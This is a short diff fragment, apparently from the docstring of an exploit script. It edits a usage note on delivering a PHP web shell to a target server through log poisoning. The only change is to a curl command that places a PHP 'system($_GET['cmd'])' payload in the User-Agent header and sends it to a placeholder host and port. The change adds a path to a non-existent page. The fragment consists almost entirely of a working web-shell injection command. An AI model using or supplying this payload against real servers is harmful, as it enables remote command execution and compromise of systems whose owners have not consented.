@@ -9,7 +9,7 @@ Notes:
 
 First you need to deliver the web shell to the target server,
 e. g. via log poisoning:
-$ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://<RHOST>:<RPORT>"
+$ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://<RHOST>:<RPORT>/non-existent-page"
 """
 
 
